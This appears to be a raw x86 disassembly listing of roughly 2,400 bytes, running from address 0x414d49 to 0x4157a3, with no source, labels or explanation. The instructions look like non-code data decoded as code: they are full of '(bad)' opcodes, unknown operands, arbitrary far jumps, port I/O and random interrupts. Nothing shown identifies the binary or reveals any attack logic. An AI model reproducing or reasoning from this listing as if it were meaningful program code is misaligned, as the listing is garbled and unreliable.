  414d49:	add    edi,DWORD PTR [ebx+ecx*8]
  414d4c:	(bad)  
  414d4e:	xor    BYTE PTR [ebx-0x24115d71],0xfc
  414d55:	call   0xb491:0x3f6dd7a7
  414d5c:	xchg   edx,eax
  414d5d:	sbb    BYTE PTR [ebx],bl
  414d5f:	rcl    BYTE PTR [ecx+0x68e52e68],cl
  414d65:	fcmovnb st,st(6)
  414d67:	shl    ch,1
  414d69:	ins    DWORD PTR es:[edi],dx
  414d6a:	push   edi
  414d6b:	retf   0xbdcf
  414d6e:	in     eax,0x4f
  414d70:	pop    ds
  414d71:	repz pop esp
  414d73:	(bad)  
  414d74:	adc    al,0x82
  414d76:	adc    ebx,DWORD PTR [ecx-0x27]
  414d79:	or     BYTE PTR [edi+0x3e28f98c],bl
  414d7f:	fdiv   DWORD PTR [ecx-0xecefa6e]
  414d85:	push   esp
  414d86:	mov    eax,ds:0x9790cef8
  414d8b:	mov    edx,DWORD PTR [esi+ebp*4-0x42]
  414d8f:	inc    edx
  414d90:	mov    es,WORD PTR [eax]
	...
  414df2:	add    BYTE PTR [eax],al
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x2cbaab91
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0xb4000001,al
  414e0d:	aas    
  414e0e:	xor    BYTE PTR [eax-0x60],ch
  414e11:	jns    0x414e23
  414e13:	dec    esp
  414e14:	add    al,0x7f
  414e16:	lea    ebx,[edi-0x66d58480]
  414e1c:	cmp    esi,DWORD PTR [eax+0x19]
  414e1f:	mov    esp,0xa3b6cd5b
  414e24:	mov    dl,0x98
  414e26:	pop    ecx
  414e27:	inc    eax
  414e28:	xchg   edi,eax
  414e29:	and    dh,dh
  414e2b:	out    0x70,eax
  414e2d:	in     al,0x77
  414e2f:	out    dx,al
  414e30:	ret    0x68a6
  414e33:	adc    BYTE PTR [eax],dh
  414e35:	mov    BYTE PTR [edi+0x35],dh
  414e38:	pop    ebx
  414e39:	jg     0x414e68
  414e3b:	cld    
  414e3c:	into   
  414e3d:	cli    
  414e3e:	cld    
  414e3f:	in     eax,0xa3
  414e41:	add    eax,0x7fa70f7a
  414e46:	loop   0x414e23
  414e48:	loop   0x414dea
  414e4a:	ins    BYTE PTR es:[edi],dx
  414e4b:	aam    0xcf
  414e4d:	push   eax
  414e4e:	mov    ebx,0xff136a7d
  414e53:	mov    edx,DWORD PTR [eax-0x4c8b5ef3]
  414e59:	xchg   esi,eax
  414e5a:	or     cl,dh
  414e5c:	retf   
  414e5d:	test   al,0x2
  414e5f:	xchg   ecx,eax
  414e60:	fnstenv [ebx]
  414e62:	fist   WORD PTR [edx]
  414e64:	sbb    DWORD PTR [eax],0xffffffea
  414e67:	adc    DWORD PTR [edi+0x1d8526b8],0xffffff85
  414e6e:	pop    eax
  414e6f:	mov    WORD PTR [esi],?
  414e71:	adc    ecx,DWORD PTR [ebp-0x52]
  414e74:	test   eax,0x96c92e81
  414e79:	(bad)
  414e7c:	xor    al,0xd1
  414e7e:	xlat   BYTE PTR ds:[ebx]
  414e7f:	das    
  414e80:	mov    esi,0x4f563fa3
  414e85:	daa    
  414e86:	mov    WORD PTR [edi],fs
  414e88:	stc    
  414e89:	int    0xb3
  414e8b:	inc    ecx
  414e8c:	dec    edx
  414e8d:	sub    esi,DWORD PTR [eax]
  414e8f:	sbb    ebx,eax
  414e91:	fldln2 
  414e93:	fs clc 
  414e95:	ret    
  414e96:	ret    0xbd2e
  414e99:	out    0x41,eax
  414e9b:	loope  0x414eb3
  414e9d:	aam    0x33
  414e9f:	sbb    eax,0x4680b823
  414ea4:	bound  ebx,QWORD PTR [ebx+0x503b8129]
  414eaa:	mov    ds:0x82f1abcb,al
  414eaf:	add    eax,0x7a697034
  414eb4:	cmp    DWORD PTR [esi],ecx
  414eb6:	imul   edx,DWORD PTR [esi-0x32ff4fc3],0xffffffcc
  414ebd:	mov    ah,0x76
  414ebf:	sbb    al,0x71
  414ec1:	xor    esi,DWORD PTR [esi]
  414ec3:	sbb    esp,ebp
  414ec5:	seta   BYTE PTR [edi]
  414ec8:	xor    BYTE PTR [ecx],0x49
  414ecb:	das    
  414ecc:	adc    bh,bl
  414ece:	retf   0x916f
  414ed1:	jns    0x414ee8
  414ed3:	jmp    0x1c0e:0xbf4cb226
  414eda:	jmp    0x414e60
  414edc:	outs   dx,DWORD PTR ds:[esi]
  414edd:	adc    al,0x41
  414edf:	mov    cl,0x51
  414ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ee2:	xchg   edi,eax
  414ee3:	sub    ecx,esp
  414ee5:	les    ecx,FWORD PTR [esi-0x77]
  414ee8:	dec    ecx
  414ee9:	add    esp,DWORD PTR [edx]
  414eeb:	retf   0xf472
  414eee:	sti    
  414eef:	pop    ss
  414ef0:	pusha  
  414ef1:	int    0x96
  414ef3:	popf   
  414ef4:	lock scas al,BYTE PTR es:[edi]
  414ef6:	or     eax,0x616c676d
  414efb:	push   ecx
  414efc:	sub    esp,ecx
  414efe:	add    BYTE PTR [esi+0x0],ah
  414f01:	sti    
  414f02:	in     eax,dx
  414f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f04:	xchg   BYTE PTR [esi+0x11b0ad34],bl
  414f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f0b:	repz rcr BYTE PTR [edi],1
  414f0e:	sbb    eax,0xc844
	...
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0xd1391c5
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0x3d000001
  414f8d:	imul   ebx,DWORD PTR [eiz*8-0xc63f8c2],0xffffff90
  414f95:	jns    0x414f3d
  414f97:	push   edx
  414f98:	push   ebx
  414f99:	inc    esp
  414f9a:	stc    
  414f9b:	shr    BYTE PTR [ecx],cl
  414f9d:	sahf   
  414f9e:	test   DWORD PTR [edi+0x27],ebp
  414fa1:	aaa    
  414fa2:	js     0x414f3f
  414fa4:	mov    ch,0xb5
  414fa6:	lods   al,BYTE PTR ds:[esi]
  414fa7:	sub    ah,BYTE PTR ss:[eax-0x14d0216d]
  414fae:	pop    ss
  414faf:	(bad)  
  414fb0:	dec    edx
  414fb1:	das    
  414fb2:	add    al,0xdc
  414fb4:	leave  
  414fb5:	push   ebp
  414fb6:	pop    ds
  414fb7:	scas   al,BYTE PTR es:[edi]
  414fb8:	mov    dl,0xa9
  414fba:	retf   0x4c3e
  414fbd:	hlt    
  414fbe:	push   0x5
  414fc0:	jnp    0x414fc2
  414fc2:	in     eax,dx
  414fc3:	int3   
  414fc4:	xchg   BYTE PTR [edx],dl
  414fc6:	jl     0x414fac
  414fc8:	cmp    eax,0x8bf65a1d
  414fcd:	retf   
  414fce:	dec    ebx
  414fcf:	imul   edx,DWORD PTR [edi],0xffffffb3
  414fd2:	js     0x415032
  414fd4:	stos   BYTE PTR es:[edi],al
  414fd5:	or     eax,0xd9cf5436
  414fda:	xor    eax,0x1dee1d1f
  414fdf:	retf   0xbf62
  414fe2:	fistp  DWORD PTR [ecx]
  414fe4:	lods   al,BYTE PTR ds:[esi]
  414fe5:	sub    eax,0xd90fda6a
  414fea:	jo     0x415035
  414fec:	arpl   dx,ax
  414fee:	xor    ch,ch
  414ff0:	or     al,bl
  414ff2:	add    al,0x59
  414ff4:	add    edx,DWORD PTR [esi+0x21]
  414ff7:	xor    BYTE PTR [esp+ebp*1],0xc8
  414ffb:	sbb    edi,DWORD PTR [edx+ebx*4]
  414ffe:	cld    
  414fff:	mov    edx,0xcf3110c2
  415004:	sar    DWORD PTR [ebx+ebx*8+0x650d6fa2],0x43
  41500c:	out    0x4,eax
  41500e:	jl     0x41502a
  415010:	inc    esp
  415011:	stos   DWORD PTR es:[edi],eax
  415012:	push   ss
  415013:	push   ecx
  415014:	(bad)  
  415015:	push   edx
  415016:	es pop edx
  415018:	nop
  415019:	fld    QWORD PTR [esi+eiz*1-0x54]
  41501d:	or     dl,BYTE PTR [ecx]
  41501f:	pop    ebp
  415020:	adc    al,0xb0
  415022:	popf   
  415023:	fldenv [ebx]
  415025:	pop    ss
  415026:	cmc    
  415027:	hlt    
  415028:	jg     0x415091
  41502a:	add    edx,DWORD PTR [esi+0x41]
  41502d:	adc    esi,DWORD PTR [eax+eax*8-0x2deecff1]
  415034:	popf   
  415035:	mov    al,0x9b
  415037:	jnp    0x415094
  415039:	fidivr DWORD PTR [edx+0x5d52346c]
  41503f:	nop
  415040:	or     ecx,DWORD PTR [esi+0x162ffa0a]
  415046:	dec    ecx
  415047:	xchg   esi,eax
  415048:	clc    
  415049:	push   cs
  41504a:	iret   
  41504b:	sbb    eax,0x898bff81
  415050:	cmc    
  415051:	mov    al,0xd7
  415053:	aaa    
  415054:	test   eax,0x87475e90
  415059:	ss pop esi
  41505b:	adc    edi,DWORD PTR ds:0x8675e746
  415061:	sbb    eax,0xb51e969
  415066:	retf   0xd5cc
  415069:	ins    BYTE PTR es:[edi],dx
  41506a:	dec    edx
  41506b:	addr16 add cl,ch
  41506e:	xchg   ebp,eax
  41506f:	mov    esi,0x9dcd28c
  415074:	sar    BYTE PTR [esi-0x48],1
  415077:	js     0x414ffe
  415079:	jno    0x41506b
  41507b:	dec    ecx
  41507c:	ja     0x4150ea
  41507e:	stos   BYTE PTR es:[edi],al
  41507f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415080:	nop    ebx
  415083:	mov    ds:0x853bcb4d,eax
  415088:	fmul   st(0),st
  41508a:	cs stos DWORD PTR es:[edi],eax
  41508c:	push   ds
  41508d:	shr    DWORD PTR [edx-0x3a],1
  415090:	jecxz  0x415092
	...
  4150f2:	add    BYTE PTR [eax],al
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x3c0dfc2d
  415102:	xchg   ebp,eax
  415103:	ficomp DWORD PTR [eax]
  415105:	fiadd  WORD PTR [eax]
  415107:	add    BYTE PTR ds:0x67000001,al
  41510d:	lock xor ebx,DWORD PTR [esi]
  415110:	xchg   ecx,eax
  415111:	inc    ecx
  415112:	rcr    bl,1
  415114:	jg     0x4150c5
  415116:	cmp    bl,BYTE PTR [eax]
  415118:	cmp    BYTE PTR [esi+0x41],0x97
  41511c:	aam    0x15
  41511e:	in     al,dx
  41511f:	mov    ah,0x17
  415121:	into   
  415122:	clc    
  415123:	add    BYTE PTR [edi+0x3df4df79],dl
  415129:	pushf  
  41512a:	push   0xffffff94
  41512c:	stos   DWORD PTR es:[edi],eax
  41512d:	jecxz  0x415139
  41512f:	push   es
  415130:	jmp    0x4150c5
  415132:	push   esi
  415133:	test   ch,cl
  415135:	fidivr DWORD PTR [eax-0x46]
  415138:	scas   eax,DWORD PTR es:[edi]
  415139:	test   eax,0xd1045d06
  41513e:	jecxz  0x4151bb
  415140:	add    bh,BYTE PTR [ebx+0x2af0f598]
  415146:	sub    ah,bh
  415148:	ret    
  415149:	fdiv   DWORD PTR [edi-0x79d70a09]
  41514f:	cli    
  415150:	mov    esp,0x75c63070
  415155:	mov    dh,0xaf
  415157:	and    ecx,edi
  415159:	test   DWORD PTR [edi],ecx
  41515b:	xor    si,WORD PTR [ebx+0x7b720568]
  415162:	dec    eax
  415163:	or     al,0xa2
  415165:	repz sub ecx,DWORD PTR ss:[ebp+0x6f]
  41516a:	cmp    BYTE PTR [ebx+0x2c77033f],0x35
  415171:	jnp    0x4151b2
  415173:	and    eax,0x86ab45d
  415178:	lds    ecx,FWORD PTR [ebx-0x3ede35]
  41517e:	xchg   BYTE PTR [edi-0xf],ch
  415181:	pop    es
  415182:	dec    eax
  415183:	cs jmp 0x41518c
  415186:	inc    esi
  415187:	stos   DWORD PTR es:[edi],eax
  415188:	(bad)  
  415189:	jnp    0x4151d3
  41518b:	mov    ebx,0xe06f87aa
  415190:	cmp    eax,DWORD PTR [eax+edx*4]
  415193:	add    dl,al
  415195:	cmp    al,0xf1
  415197:	mov    bl,0x42
  415199:	add    BYTE PTR [ecx],al
  41519b:	lods   al,BYTE PTR ds:[esi]
  41519c:	xor    edi,edi
  41519e:	je     0x415121
  4151a0:	sbb    esi,DWORD PTR [edx-0x6ae1d8b5]
  4151a6:	daa    
  4151a7:	jge    0x415201
  4151a9:	push   0xf313e5
  4151ae:	sub    BYTE PTR [ecx+0x42],bl
  4151b1:	add    DWORD PTR [ebx+0x7e],esi
  4151b4:	imul   esi,DWORD PTR [eax-0x4a948337],0xfe57f49b
  4151be:	sahf   
  4151bf:	pop    es
  4151c0:	mov    ah,0x2c
  4151c2:	push   ebp
  4151c3:	add    edx,ebp
  4151c5:	jmp    0x989d38d
  4151ca:	iret   
  4151cb:	gs js  0x415208
  4151ce:	xchg   edx,eax
  4151cf:	sub    al,0xd7
  4151d1:	(bad)  
  4151d2:	jne    0x415247
  4151d4:	sub    edx,DWORD PTR [edx-0x2f584a46]
  4151da:	add    DWORD PTR [edi+0x37],0x88749f4d
  4151e1:	mov    bh,0x48
  4151e3:	xchg   esp,eax
  4151e4:	ja     0x41523a
  4151e6:	sbb    DWORD PTR [eax+0x7bb9d983],edx
  4151ec:	mov    cl,BYTE PTR [eax]
  4151ee:	scas   eax,DWORD PTR es:[edi]
  4151ef:	iret   
  4151f0:	leave  
  4151f1:	adc    eax,0x117ff9b4
  4151f6:	rcr    BYTE PTR [ebx-0xd643cc5],cl
  4151fc:	add    cl,BYTE PTR [eax-0x6dda3666]
  415202:	int    0xe8
  415204:	sti    
  415205:	je     0x415262
  415207:	jge    0x4151a3
  415209:	lock in al,dx
  41520b:	mov    ecx,DWORD PTR [eax-0x6c]
  41520e:	cmp    BYTE PTR [eax+0x7e],0x0
	...
  415272:	add    BYTE PTR [eax],al
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xe7d7f40b
  415283:	sub    ebx,DWORD PTR ds:0x50000df
  415289:	add    DWORD PTR [eax],eax
  41528b:	add    BYTE PTR [edx+0x10],ah
  41528e:	push   esi
  41528f:	push   ebp
  415290:	stos   DWORD PTR es:[edi],eax
  415291:	in     eax,dx
  415292:	mov    ebx,0x6887933
  415297:	rcl    BYTE PTR [esi-0x3e23143e],cl
  41529d:	xchg   DWORD PTR [ebp+0x31],esp
  4152a0:	dec    esi
  4152a1:	mov    ?,WORD PTR [edx+esi*1+0x2c]
  4152a5:	xchg   edi,eax
  4152a6:	cld    
  4152a7:	inc    edx
  4152a8:	test   eax,0x497f8d41
  4152ad:	adc    ch,bl
  4152af:	ds push esi
  4152b1:	inc    ebp
  4152b2:	dec    eax
  4152b3:	lods   eax,DWORD PTR ds:[esi]
  4152b4:	lods   eax,DWORD PTR ds:[esi]
  4152b5:	(bad)
  4152b8:	(bad)  
  4152b9:	xor    dl,BYTE PTR [ebp+0x127630f8]
  4152bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152c0:	(bad)
  4152c4:	mov    ecx,0x17115fa1
  4152c9:	mov    cs,WORD PTR [edi-0x2b]
  4152cc:	sbb    al,0xff
  4152ce:	mov    edx,0xe38f299f
  4152d3:	jg     0x415297
  4152d5:	pop    ecx
  4152d6:	sbb    esp,eax
  4152d8:	pop    ebx
  4152d9:	ins    DWORD PTR es:[edi],dx
  4152da:	mov    ebp,0x4ed6b682
  4152df:	out    dx,al
  4152e0:	dec    esi
  4152e1:	jo     0x415334
  4152e3:	mov    BYTE PTR [eax-0x32],ch
  4152e6:	cmp    BYTE PTR [esi],bl
  4152e8:	xor    ah,BYTE PTR [esi-0x1]
  4152eb:	cs jl  0x4152bf
  4152ee:	leave  
  4152ef:	mov    BYTE PTR [ecx-0x50ba02f8],al
  4152f5:	aaa    
  4152f6:	pop    esp
  4152f7:	xor    edi,esp
  4152f9:	xor    eax,0x3188907d
  4152fe:	fwait
  4152ff:	mov    bl,0xe4
  415301:	repnz adc DWORD PTR [esi-0x398f8245],esi
  415308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415309:	sub    esp,ebp
  41530b:	xchg   bh,cl
  41530d:	inc    ebx
  41530e:	sti    
  41530f:	xor    eax,0x23aba7b
  415314:	leave  
  415315:	adc    al,0x2c
  415317:	xchg   BYTE PTR [eax],bh
  415319:	popf   
  41531a:	rol    DWORD PTR [edi+0x4],1
  41531d:	clc    
  41531e:	mov    ch,0x6a
  415320:	jmp    DWORD PTR [eax+0x166b73a3]
  415326:	(bad)  
  415327:	addr16 xchg ecx,eax
  415329:	std    
  41532a:	add    al,0x5f
  41532c:	xor    esp,DWORD PTR [eax-0x77]
  41532f:	sbb    DWORD PTR [ecx-0x24],edi
  415332:	push   esi
  415333:	jbe    0x415346
  415335:	mov    bh,0xc6
  415337:	xor    eax,0x8069de88
  41533c:	push   esi
  41533d:	xchg   DWORD PTR [esi-0x6f1bce65],ebx
  415343:	xor    BYTE PTR [edi-0x5aaa7b10],ah
  415349:	js     0x41537a
  41534b:	test   eax,0x84306a0f
  415350:	push   ebx
  415351:	fiadd  WORD PTR [edi+0x1e109d91]
  415357:	jne    0x41533c
  415359:	mov    ebp,0xf437ddd6
  41535e:	inc    edi
  41535f:	dec    edi
  415360:	or     al,BYTE PTR [ecx]
  415362:	mov    BYTE PTR [eax+edx*2+0x27],ch
  415366:	shl    BYTE PTR [edx+edi*4+0x2e],cl
  41536a:	mov    ebp,0xa8915bec
  41536f:	sti    
  415370:	fsub   QWORD PTR [ebx-0x69]
  415373:	mov    ah,0xaa
  415375:	xor    esp,DWORD PTR [esi]
  415377:	mov    dh,0xb3
  415379:	mov    ds:0xaa25746e,eax
  41537e:	mov    dl,0xb2
  415380:	repz or DWORD PTR [ebx],ebx
  415383:	mov    esi,cs
  415385:	mov    al,0x7d
  415387:	mov    esp,ecx
  415389:	sub    eax,0x728955e3
  41538e:	adc    eax,0xfd7a
	...
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xa0d3e5b0
  415401:	push   ss
  415402:	retf   0x22f1
  415405:	loopne 0x415407
  415407:	add    BYTE PTR ds:0xa0000001,al
  41540d:	jl     0x41546b
  41540f:	mov    dh,0xe2
  415411:	jo     0x3edc50ac
  415417:	fst    st(6)
  415419:	xchg   esp,eax
  41541a:	sar    BYTE PTR [edi+0x1c],0x31
  41541e:	jl     0x41540c
  415420:	cmc    
  415421:	mov    ecx,DWORD PTR [edx+0x213862d2]
  415427:	ror    DWORD PTR [esi+0x94d487d],cl
  41542d:	jbe    0x415416
  41542f:	pop    ebp
  415430:	sub    eax,0x3f977fb3
  415435:	adc    eax,ebx
  415437:	and    eax,0x9882af1e
  41543c:	sub    BYTE PTR [eax+0x408326ae],bh
  415442:	scas   eax,DWORD PTR es:[edi]
  415443:	sub    ch,bh
  415445:	adc    al,BYTE PTR [ebp-0xc937d99]
  41544b:	sub    bh,al
  41544d:	push   ebx
  41544e:	leave  
  41544f:	dec    edi
  415450:	jp     0x4153d3
  415452:	or     BYTE PTR [ebx+0xf1823c2],ah
  415458:	jecxz  0x4154d1
  41545a:	mov    WORD PTR ds:0xc52aa757,fs
  415460:	sbb    DWORD PTR [esi],edi
  415462:	xchg   edi,eax
  415463:	enter  0x36df,0x91
  415467:	stos   DWORD PTR es:[edi],eax
  415468:	rcr    BYTE PTR [ecx],cl
  41546a:	and    DWORD PTR [ebx+0x68],edi
  41546d:	(bad)  
  41546e:	imul   esp,esp,0xcaecda7d
  415474:	dec    ebp
  415475:	dec    edi
  415476:	pop    edx
  415477:	xor    bl,BYTE PTR [ebx+0xc]
  41547a:	sbb    al,0xc
  41547c:	add    DWORD PTR [edi+0x1d],edi
  41547f:	and    cl,BYTE PTR ds:0x65cbe40a
  415485:	pop    es
  415486:	das    
  415487:	lods   eax,DWORD PTR ds:[esi]
  415488:	les    ecx,FWORD PTR [ebp+0x3167c03d]
  41548e:	jb     0x41543f
  415490:	loopne 0x41548f
  415492:	push   0xffffffd3
  415494:	add    bh,al
  415496:	mov    DWORD PTR [ebx+0x6c],0xe30a981e
  41549d:	xchg   edi,eax
  41549e:	pop    ss
  41549f:	repnz dec edi
  4154a1:	vunpckhps ymm0,ymm3,YMMWORD PTR [eax+0x49]
  4154a6:	(bad)  
  4154a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154a8:	sti    
  4154a9:	in     al,0xa7
  4154ab:	aad    0x59
  4154ad:	inc    ebp
  4154ae:	mov    edi,0x64f158c9
  4154b3:	out    0x8f,eax
  4154b5:	sub    dl,BYTE PTR [ebx]
  4154b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154b9:	mov    edx,0x5ab4a8c0
  4154be:	sbb    eax,0xdb87dff1
  4154c3:	test   eax,0xea1bdd09
  4154c8:	sub    al,0x6e
  4154ca:	stos   BYTE PTR es:[edi],al
  4154cb:	sbb    dh,dl
  4154cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154ce:	icebp  
  4154cf:	dec    esi
  4154d0:	mov    dl,0x39
  4154d2:	inc    esi
  4154d3:	imul   ebx,DWORD PTR [eax+0x69a92063],0xecf6f24a
  4154dd:	cs popa 
  4154df:	adc    eax,DWORD PTR [bp-0x67]
  4154e3:	jp     0x415468
  4154e5:	fsub   DWORD PTR [ebp+0x71c0819d]
  4154eb:	dec    esp
  4154ec:	push   ebx
  4154ed:	pop    ebp
  4154ee:	scas   eax,DWORD PTR es:[edi]
  4154ef:	jae    0x41550c
  4154f1:	mov    BYTE PTR [ecx+0x54],ah
  4154f4:	idiv   DWORD PTR [ebx]
  4154f6:	out    dx,al
  4154f7:	and    edx,DWORD PTR [edi+0x6d]
  4154fa:	jge    0x4154c9
  4154fc:	repz push edi
  4154fe:	or     ebp,DWORD PTR [eax]
  415500:	sub    DWORD PTR [ebx],ebp
  415502:	pop    ds
  415503:	pusha  
  415504:	xor    al,0x72
  415506:	sub    eax,0x1fe4daad
  41550b:	pop    es
  41550c:	je     0x4154a5
  41550e:	lods   al,BYTE PTR ds:[esi]
  41550f:	(bad)  [ecx+0x0]
	...
  415572:	add    BYTE PTR [eax],al
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x41550e
  415581:	pop    ecx
  415582:	lods   eax,DWORD PTR ds:[esi]
  415583:	hlt    
  415584:	daa    
  415585:	loope  0x415587
  415587:	add    BYTE PTR ds:0x9000001,al
  41558d:	cmp    eax,0x66194e12
  415592:	les    ebx,FWORD PTR [ebx+0x7f]
  415595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415596:	loope  0x41553a
  415598:	arpl   WORD PTR [ebx-0x4],dx
  41559b:	add    ah,cl
  41559d:	cmp    BYTE PTR [edx-0x2944fe11],ch
  4155a3:	pop    ds
  4155a4:	or     ebp,DWORD PTR [esp+esi*2+0xc510499]
  4155ab:	mov    dh,0x6f
  4155ad:	jb     0x4155d2
  4155af:	loope  0x415537
  4155b1:	jae    0x4155c3
  4155b3:	cmp    bh,ch
  4155b5:	setns  BYTE PTR [esi]
  4155b8:	outs   dx,DWORD PTR ds:[esi]
  4155b9:	fsub   DWORD PTR [ebp-0x37389a8a]
  4155bf:	dec    esp
  4155c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155c1:	dec    ebp
  4155c2:	mov    ah,0xa0
  4155c4:	ja     0x415591
  4155c6:	mov    WORD PTR [ebx+edx*8-0x9c9a61f],gs
  4155cd:	pusha  
  4155ce:	fdivr  QWORD PTR [ebx]
  4155d0:	test   al,0x3
  4155d2:	xor    DWORD PTR [edi+edi*8+0x62],esi
  4155d6:	mov    al,0x2f
  4155d8:	cwde   
  4155d9:	jne    0x41560b
  4155db:	jne    0x4155aa
  4155dd:	mov    edx,0xa16a50fc
  4155e2:	shl    edx,0x8
  4155e5:	lods   al,BYTE PTR ds:[esi]
  4155e6:	xchg   edx,ecx
  4155e8:	lock mov ch,0x91
  4155eb:	push   0x8
  4155ed:	push   esp
  4155ee:	fsubr  QWORD PTR es:[ecx-0x22]
  4155f2:	mov    BYTE PTR [ecx+edi*2],ah
  4155f5:	jecxz  0x4155e5
  4155f7:	and    BYTE PTR [edi-0x51554d7d],dl
  4155fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155fe:	sbb    BYTE PTR [ebx],ch
  415600:	mov    al,BYTE PTR [edx-0x1f]
  415603:	push   edx
  415604:	xor    BYTE PTR [eax],bh
  415606:	xlat   BYTE PTR ds:[ebx]
  415607:	add    DWORD PTR [edi+ebp*2+0x42],ebx
  41560b:	sub    al,0x11
  41560d:	std    
  41560e:	dec    esp
  41560f:	xchg   DWORD PTR [edi+0x1b],ebp
  415612:	ins    DWORD PTR es:[edi],dx
  415613:	xor    DWORD PTR [ecx+eiz*2+0x26649660],edx
  41561a:	xor    bl,BYTE PTR [ebx+0x25]
  41561d:	lods   eax,DWORD PTR cs:[esi]
  41561f:	bound  ebx,QWORD PTR [edx+eax*8]
  415622:	arpl   WORD PTR [ecx+0x7d],sp
  415625:	mov    eax,eax
  415627:	mov    ch,0xe
  415629:	ret    
  41562a:	fsubr  QWORD PTR [ebx-0x1b1d218a]
  415630:	xchg   DWORD PTR [ecx+eax*2],esi
  415633:	fs pop edi
  415635:	idiv   DWORD PTR [eax-0x4b]
  415638:	dec    eax
  415639:	jecxz  0x415649
  41563b:	ret    0xa526
  41563e:	das    
  41563f:	test   eax,0x640a0e7b
  415644:	jl     0x415639
  415646:	pop    edx
  415647:	fwait
  415648:	mov    cl,0xbf
  41564a:	test   BYTE PTR [esi+esi*1+0x7500def0],al
  415651:	mov    ecx,0x364a550f
  415656:	test   al,0x66
  415658:	mov    DWORD PTR [eax],ebx
  41565a:	aam    0x99
  41565c:	adc    DWORD PTR [ecx+0xa8a7ad4],eax
  415662:	pop    ebp
  415663:	pop    ss
  415664:	nop
  415665:	mov    ds:0xee6b03c9,al
  41566a:	or     eax,0x5ae39495
  41566f:	mov    eax,0x7d8380f2
  415674:	inc    esi
  415675:	out    dx,al
  415676:	ins    BYTE PTR es:[edi],dx
  415677:	mov    edi,0x4802f246
  41567c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41567d:	cmp    eax,0x4a03c930
  415682:	push   eax
  415683:	sbb    DWORD PTR [edx+0x7a],edx
  415686:	inc    edi
  415687:	js     0x4156dd
  415689:	sar    DWORD PTR [ecx],0xfa
  41568c:	out    dx,al
  41568d:	xchg   ecx,eax
  41568e:	xchg   esp,eax
  41568f:	jmp    0x415651
	...
  4156f1:	add    BYTE PTR [eax],al
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	push   0x56
  415702:	adc    DWORD PTR [esp+ebp*1+0x50000e2],eax
  415709:	add    DWORD PTR [eax],eax
  41570b:	add    dl,dh
  41570d:	jle    0x4156d9
  41570f:	scas   eax,DWORD PTR es:[edi]
  415710:	mov    esi,0x1ef4ae54
  415715:	and    ch,BYTE PTR [ecx]
  415717:	scas   al,BYTE PTR es:[edi]
  415718:	mov    edi,0x5e9da7e3
  41571d:	fistp  WORD PTR [ecx]
  41571f:	rcr    BYTE PTR [ecx+0x50b27e73],1
  415725:	push   edi
  415726:	pop    esi
  415727:	mov    edi,0xbff386e5
  41572c:	xor    eax,0xbc18a48e
  415731:	and    dh,cl
  415733:	retf   0x2f1c
  415736:	xor    DWORD PTR [eax],0x4b
  415739:	push   ebx
  41573a:	mov    ebp,edi
  41573c:	jo     0x415701
  41573e:	jecxz  0x415707
  415740:	xchg   esi,eax
  415741:	stc    
  415742:	es push 0xa83ce825
  415748:	test   ax,0x210f
  41574c:	adc    ebx,DWORD PTR [edi]
  41574e:	mov    DWORD PTR [ebp-0xf96c1da],ecx
  415754:	lock ins BYTE PTR es:[edi],dx
  415756:	repnz mov DWORD PTR [edi],esp
  415759:	add    ah,BYTE PTR [esi-0x13bf40c4]
  41575f:	xor    DWORD PTR [ebx],esi
  415761:	loope  0x41574d
  415763:	sub    ecx,ebp
  415765:	adc    ch,dl
  415767:	iret   
  415768:	stc    
  415769:	das    
  41576a:	loop   0x415725
  41576c:	pop    ss
  41576d:	(bad)  
  41576f:	adc    ecx,esi
  415771:	sbb    DWORD PTR [ebp+0x852c370],edi
  415777:	pop    ds
  415778:	(bad)  [eax]
  41577a:	jns    0x4157bb
  41577c:	push   edi
  41577d:	mov    ah,0x9c
  41577f:	cmc    
  415780:	and    BYTE PTR [edi],al
  415782:	(bad)
  415787:	outs   dx,DWORD PTR ds:[esi]
  415788:	or     BYTE PTR [ecx-0x6d2e05de],dh
  41578e:	mov    al,BYTE PTR [ebx]
  415790:	xor    dl,bh
  415792:	xchg   esi,eax
  415793:	fwait
  415794:	inc    edx
  415795:	retf   
  415796:	in     eax,0x79
  415798:	inc    esp
  415799:	and    dl,BYTE PTR [ebx-0x21]
  41579c:	mov    ch,BYTE PTR [ecx-0x306c85b9]
  4157a2:	sti    
  4157a3:	and    BYTE PTR [ebx+0x9],0x2b
